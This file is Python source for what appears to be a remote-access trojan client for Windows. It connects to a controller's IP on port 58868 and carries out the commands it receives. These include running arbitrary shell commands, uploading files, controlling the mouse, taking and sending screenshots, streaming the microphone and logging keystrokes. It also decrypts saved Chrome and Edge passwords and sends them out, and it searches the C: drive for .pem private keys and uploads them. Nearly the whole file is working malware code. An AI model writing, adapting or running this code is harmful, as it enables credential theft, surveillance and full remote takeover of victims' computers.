import socket
import subprocess
from math import *
import threading
import struct
import os
import re
from ctypes import cast, POINTER
import pyautogui
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import time
import pyaudio
import keyboard
from PIL import Image

CHROME_PATH_LOCAL_STATE = os.path.normpath(
    r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

EDGE_PATH_LOCAL_STATE = os.path.normpath(
    r"%s\AppData\Local\Microsoft\Edge\User Data\Local State" % (os.environ['USERPROFILE']))
EDGE_PATH = os.path.normpath(r"%s\AppData\Local\Microsoft\Edge\User Data" % (os.environ['USERPROFILE']))

find_command = 'dir C:\ /s /b | findstr /i "\.pem$"'

img_path = "E:\\compressed_screenshots\\"
nircmd_command = 'nircmd savescreenshot E:\\screenshots\\'
num_screenshots = 100

mic_exit_flag = False
mic_join_flag = False
key_exit_flag = False
key_join_flag = False
events = ""


def compress_images():
    input_folder = "E:\\screenshots\\"
    output_folder = "E:\\compressed_screenshots\\"
    # Ensure output folder exists
    if not os.path.exists(output_folder):
        os.makedirs(output_folder)

    # Get a list of all files in the input folder
    files = os.listdir(input_folder)

    for file in files:
        input_path = os.path.join(input_folder, file)

        # Check if the file is an image (JPEG format)
        if file.lower().endswith(('.jpg')):
            output_path = os.path.join(output_folder, file)

            # Open the image
            img = Image.open(input_path)

            # Save the image with decreased compression quality
            img.save(output_path, quality=5)


def findPass_command(command_one):
    try:
        result = subprocess.check_output(command_one, shell=True, text=True)
        return result.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
        return None


def decrypt_chrome(s):
    def get_secret_key_chrome():
        try:
            # (1) Get secretkey from chrome local state
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove suffix DPAPI
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome secretkey cannot be found")
            return None

    def get_secret_key_edge():
        try:
            # (1) Get secretkey from chrome local state
            with open(EDGE_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove suffix DPAPI
            secret_key = secret_key[5:]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome secretkey cannot be found")
            return None

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            # (3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            # (3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            # Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            # (4) Build the cipher to decrypt the ciphertext
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""

    def get_db_connection(chrome_path_login_db):
        try:
            print(chrome_path_login_db)
            shutil.copy2(chrome_path_login_db, "Loginvault.db")
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome database cannot be found")
            return None

    try:
        information_ls = ""
        # Create Dataframe to store passwords
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])
            # (1) Get secret key
            secret_key_chrome = get_secret_key_chrome()
            secret_key_edge = get_secret_key_edge()
            # Search user profile or default folder (this is where the encrypted login password is stored)
            folders = [element for element in os.listdir(CHROME_PATH) if
                       re.search("^Profile*|^Default$", element) != None]
            for folder in folders:
                # (2) Get ciphertext from sqlite database
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                if (secret_key_chrome and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if (url != "" and username != "" and ciphertext != ""):
                            # (3) Filter the initialisation vector & encrypted password from ciphertext
                            # (4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key_chrome)
                            information = url + ";" + username + ";" + decrypted_password + ";"
                            information_ls += information
                            # (5) Save into CSV
                            csv_writer.writerow([index, url, username, decrypted_password])
                    # Close database connection
                    cursor.close()
                    conn.close()
                    # Delete temp login db
                    os.remove("Loginvault.db")

            folders = [element for element in os.listdir(EDGE_PATH) if
                       re.search("^Profile*|^Default$", element) != None]
            for folder in folders:
                # (2) Get ciphertext from sqlite database
                edge_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (EDGE_PATH, folder))
                conn = get_db_connection(edge_path_login_db)
                if (secret_key_edge and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if (url != "" and username != "" and ciphertext != ""):
                            # (3) Filter the initialisation vector & encrypted password from ciphertext
                            # (4) Use AES algorithm to decrypt the password
                            decrypted_password = decrypt_password(ciphertext, secret_key_edge)
                            information = url + ";" + username + ";" + decrypted_password + ";"
                            information_ls += information
                            # (5) Save into CSV
                            csv_writer.writerow([index, url, username, decrypted_password])
                    # Close database connection
                    cursor.close()
                    conn.close()
                    # Delete temp login db
                    os.remove("Loginvault.db")
        s.send(len(information_ls).to_bytes(4, byteorder='big'))
        s.send(information_ls.encode('UTF-8'))
        return
    except Exception as e:
        print("[ERR] %s" % str(e))


def socket_client():
    if os.path.isfile(filepath):
        fhead = struct.pack('128sl', os.path.basename(filepath).encode('utf-8'), os.stat(filepath).st_size)
        s.send(fhead)

        fp = open(filepath, 'rb')
        while 1:
            data = fp.read(1024)
            if not data:
                print('{0} file send over...'.format(os.path.basename(filepath)))
                break
            s.send(data)


def send_pass(file_path):
    data_to_send = len(file_path)
    packed_data = struct.pack('!I', data_to_send)
    s.send(packed_data)
    for filepath in file_path:
        print("sending: " + filepath)
        if os.path.isfile(filepath):
            fhead = struct.pack('128sl', os.path.basename(filepath).encode('utf-8'), os.stat(filepath).st_size)
            s.send(fhead)

            fp = open(filepath, 'rb')
            while 1:
                data = fp.read(1024)
                if not data:
                    print('{0} file send over...'.format(os.path.basename(filepath)))
                    break
                s.send(data)
    print("========== send end ==========")


def mouseControl():
    data = s.recv(1024).decode('utf-8')
    pos = data.split(",")
    if pos[0] != "quit":
        x_relPos = float(pos[2])
        y_relPos = float(pos[3])
        x_pos = int(x_relPos * x_size)
        y_pos = int(y_relPos * y_size)
        pyautogui.moveTo(x=x_pos, y=y_pos)
        if pos[1] == "LD":
            pyautogui.mouseDown()
        if pos[1] == "LU":
            pyautogui.mouseUp()
        if pos[1] == "RD":
            pyautogui.mouseDown(button="right")
        if pos[1] == "RU":
            pyautogui.mouseUp(button="right")

def screen_shot():
    for i in range(num_screenshots):
        filename = 'tmp' + str(i) + '.jpg'
        new_cmd = nircmd_command + filename
        subprocess.run(new_cmd, shell=True)
    time.sleep(2)
    send_img()

def send_img():
    compress_images()
    images = [img for img in os.listdir(img_path) if img.endswith(".png") or img.endswith(".jpg")]
    images.sort()
    for img in images:
        path = os.path.join(img_path, img)
        with open(path, 'rb') as file:
            image_data = file.read()
        time.sleep(0.8)
        s.send(len(image_data).to_bytes(4, byteorder='big'))
        time.sleep(0.3)
        s.send(image_data)
        os.remove(path)
        path = os.path.join("E:\\screenshots\\", img)

def micro_listen():
    global mic_exit_flag
    global mic_join_flag
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16,
                    channels=1,
                    rate=44100,
                    input=True,
                    frames_per_buffer=1024)
    while not mic_exit_flag:
        data = stream.read(1024)
        s.send(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    mic_join_flag = True


def check_micStop():
    global mic_exit_flag
    data = s.recv(1024).decode('utf-8')
    if data[0] == "q":
        mic_exit_flag = True


def keyboard_listen():
    global key_exit_flag
    global key_join_flag
    global events
    events = ""
    while not key_exit_flag:
        event = keyboard.read_event(suppress=False)
        events += str(event) + "\n"

    key_join_flag = True


def check_keyStop():
    global key_exit_flag
    global events
    data = s.recv(1024).decode('utf-8')
    if data[0] == "q":
        key_exit_flag = True
        s.send(len(events).to_bytes(4, byteorder='big'))
        s.send(events.encode('utf-8'))


if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ip = input("Please input the target IP address: ")
    if (re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",
                 ip)) == False:
        while True:
            ip = input("IP address is not valid, please try again: ")
            if (re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$",
                         ip)):
                break
    flag = True
    print("Connnecting to {0}, please wait .......".format(ip))
    while flag:
        try:
            s.connect((ip, 58868))
            flag = False
        except:
            continue
    print("connected to {0}".format(ip))
    while True:
        data = s.recv(1024).decode('utf-8')
        if data == "":
            continue
        elif data[0] == "s" and data[1] == "e":
            command = data.split()
            filepath = command[1]
            print(filepath)
            socket_client()
        elif data[0] == "c" and data[1] == "m" and data[2] == "d":
            data = data[4:]
            print(data)
            subprocess.Popen(data, stdin=subprocess.PIPE, shell=True)
        elif data[0] == "m" and data[1] == "o":
            x_size, y_size = pyautogui.size()
            while True:
                try:
                    mouseControl()
                except:
                    continue
        elif data[0] == "f" and data[1] == "i":
            decrypt_chrome(s)
            output = findPass_command(find_command)
            pass_ls = output.split("\n")
            if (len(pass_ls) != 0):
                send_pass(pass_ls)
        elif data[0] == "s" and data[1] == "c":
            screen_shot()
        elif data[0] == "m" and data[1] == "i":
            listenMic = threading.Thread(target=micro_listen)
            listenMic.start()
            stopMic = threading.Thread(target=check_micStop)
            stopMic.start()
            while True:
                if (mic_join_flag):
                    listenMic.join()
                    stopMic.join()
                    mic_join_flag = False
                    mic_exit_flag = False
                    print("threads terminated")
                    break
        elif data[0] == "k" and data[1] == "e":
            listenKey = threading.Thread(target=keyboard_listen)
            listenKey.start()
            check_keyStop()
            listenKey.join()
            key_exit_flag=False
            key_join_flag=False
        elif data[0] == "q" and data[1] == "u":
            s.close()
            break
